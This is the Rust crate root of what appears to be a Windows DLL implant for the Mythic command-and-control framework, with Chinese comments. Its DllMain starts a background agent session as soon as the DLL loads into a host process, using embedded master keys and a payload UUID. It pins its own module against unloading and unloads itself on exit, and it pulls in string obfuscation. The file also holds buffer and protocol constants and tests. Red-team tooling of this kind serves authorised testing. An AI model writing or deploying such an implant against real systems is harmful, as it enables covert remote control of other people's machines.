pub mod buffer;
pub mod commands {
    pub mod file;
}
pub use commands::file;
pub mod config;
pub mod engine;
pub mod error;
pub mod protocol;
pub mod sysinfo;
pub mod stream;
pub mod transfer;

pub use obfstr;

pub mod profiles {
    pub mod crypto;
    pub mod http;
}

// =========================================================================
// 核心内存工作区与缓冲区规格显式门面重导出 (Facade 门面收敛，杜绝通配符命名空间污染)
// =========================================================================
pub use crate::buffer::{
    ActiveStackWorkspace, DefaultStackWorkspace, StackVec,
    ACTIVE_WIRE_SIZE, BUFFER_SIZE, MAX_B64_LEN, MAX_PLAINTEXT_LEN, MAX_RAW_LEN,
};

// 向后兼容模块别名与多桶调度器重导出
pub use protocol as mythic_message_type;
pub use protocol::DynamicBudget;

// 顶层统一错误收敛门面导出
pub use error::{WisconsinError, WisconsinResult};

// 零堆纯栈流式传输与原生文件 I/O 门面重导出
pub use stream::{MemorySliceReader, ZeroRead, ZeroSeek, ZeroWrite};
#[cfg(windows)]
pub use stream::NativeFileHandle;
pub use transfer::{TransferReceiveSession, TransferRegisterMeta, TransferSession, TransferSource};

// =========================================================================
// 全局动态关停控制与 DLL 导出 (Global Dynamic Shutdown & DLL Entrypoint)
// =========================================================================

#[cfg(windows)]
static SHUTDOWN_REQUESTED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(false);

/// 查询是否收到了动态卸载或关停信号
#[inline(always)]
pub fn is_shutdown_requested() -> bool {
    #[cfg(windows)]
    {
        SHUTDOWN_REQUESTED.load(core::sync::atomic::Ordering::Relaxed)
    }
    #[cfg(not(windows))]
    {
        false
    }
}

/// 标记全局退出信号 (供 DllMain 或外部宿主调用)
#[inline(always)]
pub fn request_shutdown() {
    #[cfg(windows)]
    {
        SHUTDOWN_REQUESTED.store(true, core::sync::atomic::Ordering::SeqCst);
    }
}

#[cfg(windows)]
unsafe extern "system" {
    fn DisableThreadLibraryCalls(hLibModule: *mut core::ffi::c_void) -> i32;
    fn GetModuleHandleExW(
        dwFlags: u32,
        lpModuleName: *const u16,
        phModule: *mut *mut core::ffi::c_void,
    ) -> i32;
    fn FreeLibraryAndExitThread(hLibModule: *mut core::ffi::c_void, dwExitCode: u32) -> !;
}

#[cfg(windows)]
const DLL_PROCESS_DETACH: u32 = 0;
#[cfg(windows)]
const DLL_PROCESS_ATTACH: u32 = 1;
#[cfg(windows)]
const GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: u32 = 0x00000004;

#[cfg(windows)]
#[unsafe(no_mangle)]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    hinst_dll: *mut core::ffi::c_void,
    fdw_reason: u32,
    lpv_reserved: *mut core::ffi::c_void,
) -> i32 {
    match fdw_reason {
        DLL_PROCESS_ATTACH => {
            // 1. 禁用线程级加载与卸载通知，杜绝频繁重入与线程退出时的 Loader Lock 潜在死锁
            unsafe {
                DisableThreadLibraryCalls(hinst_dll);
            }

            // 2. 复位全局退出信号
            SHUTDOWN_REQUESTED.store(false, core::sync::atomic::Ordering::SeqCst);

            // 3. 启动后台主通信工作线程
            std::thread::spawn(move || {
                // 3.1 自持模块引用计数：防止宿主进程过早调用 FreeLibrary 解映射代码导致 0xC0000005
                let mut self_module: *mut core::ffi::c_void = core::ptr::null_mut();
                let has_pin = unsafe {
                    GetModuleHandleExW(
                        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
                        DllMain as *const () as *const u16,
                        &mut self_module,
                    ) != 0
                };

                let master_key = crate::config::AgentConfig::master_key();
                let payload_uuid = crate::config::AgentConfig::payload_uuid_bytes();
                if let Ok(mut session) = crate::engine::AgentSession::new(&master_key, &payload_uuid) {
                    session.run();
                }

                // 3.2 工作线程退出时：如果持有了本模块引用，原子释放引用并安全自杀退出
                if has_pin && !self_module.is_null() {
                    unsafe {
                        FreeLibraryAndExitThread(self_module, 0);
                    }
                }
            });
        }
        DLL_PROCESS_DETACH => {
            // 严格区分：lpv_reserved == NULL 标识动态卸载 (FreeLibrary)，非 NULL 标识宿主进程整体退出 (ExitProcess)
            if lpv_reserved.is_null() {
                // 发出全局原子关停信号，通知 session.run 细粒度可中断休眠与主循环迅速安全退出
                SHUTDOWN_REQUESTED.store(true, core::sync::atomic::Ordering::SeqCst);
            }
        }
        _ => {}
    }
    1
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::buffer::*;

    #[test]
    fn test_facade_constants_and_derivations() {
        assert_eq!(UUID_LEN, 36);
        assert_eq!(IV_LEN, 16);
        assert_eq!(HMAC_LEN, 32);
        assert_eq!(AES_BLOCK_SIZE, 16);
        assert_eq!(PKCS7_WORST_PADDING, 16);
        assert_eq!(PROTOCOL_HEADER_LEN, 84);
        assert_eq!(MIN_ENCRYPTED_PAYLOAD_LEN, 64);
        assert_eq!(MIN_RAW_MESSAGE_LEN, 100);

        // 4K 衍生常量测试
        assert_eq!(WIRE_SIZE_4K, 4096);
        assert_eq!(RAW_LEN_4K, 3072);
        assert_eq!(CIPHERTEXT_LEN_4K, 2976);
        assert_eq!(PLAINTEXT_LEN_4K, 2960);
        assert_eq!(RAW_READ_4K, 2106);
        assert_eq!(RAW_READ_4K % 3, 0);

        // 16K 衍生常量测试
        assert_eq!(WIRE_SIZE_16K, 16384);
        assert_eq!(RAW_LEN_16K, 12288);
        assert_eq!(CIPHERTEXT_LEN_16K, 12192);
        assert_eq!(PLAINTEXT_LEN_16K, 12176);
        assert_eq!(RAW_READ_16K, 9018);
        assert_eq!(RAW_READ_16K % 3, 0);

        // 64K 衍生常量测试
        assert_eq!(WIRE_SIZE_64K, 65536);
        assert_eq!(RAW_LEN_64K, 49152);
        assert_eq!(CIPHERTEXT_LEN_64K, 49056);
        assert_eq!(PLAINTEXT_LEN_64K, 49040);
        assert_eq!(RAW_READ_64K, 36666);
        assert_eq!(RAW_READ_64K % 3, 0);

        // Active 常量联动测试
        assert_eq!(MAX_B64_LEN, ACTIVE_WIRE_SIZE);
        assert_eq!(MAX_RAW_LEN, calc_raw_len(ACTIVE_WIRE_SIZE));
        assert_eq!(MAX_PLAINTEXT_LEN, calc_max_plaintext_len(MAX_RAW_LEN));
        assert_eq!(MAX_RAW_READ, calc_max_raw_read(MAX_PLAINTEXT_LEN, DEFAULT_JSON_OVERHEAD));

        // BUFFER_SIZE 与各子模块重导出校验测试
        assert_eq!(BUFFER_SIZE, ACTIVE_WIRE_SIZE);
        assert_eq!(crate::protocol::BUFFER_SIZE, BUFFER_SIZE);
        assert_eq!(crate::profiles::crypto::BUFFER_SIZE, BUFFER_SIZE);
        assert_eq!(crate::buffer::BUFFER_SIZE, BUFFER_SIZE);

        // Padded length 计算测试
        assert_eq!(calc_padded_len(0), 16);
        assert_eq!(calc_padded_len(15), 16);
        assert_eq!(calc_padded_len(16), 32);
        assert_eq!(calc_raw_total(0), 84 + 16);
        assert_eq!(calc_raw_total(16), 84 + 32);
    }

    #[test]
    fn test_shutdown_signal_lifecycle() {
        assert!(!is_shutdown_requested());
        request_shutdown();
        assert!(is_shutdown_requested());
        #[cfg(windows)]
        SHUTDOWN_REQUESTED.store(false, core::sync::atomic::Ordering::SeqCst);
        assert!(!is_shutdown_requested());
    }
}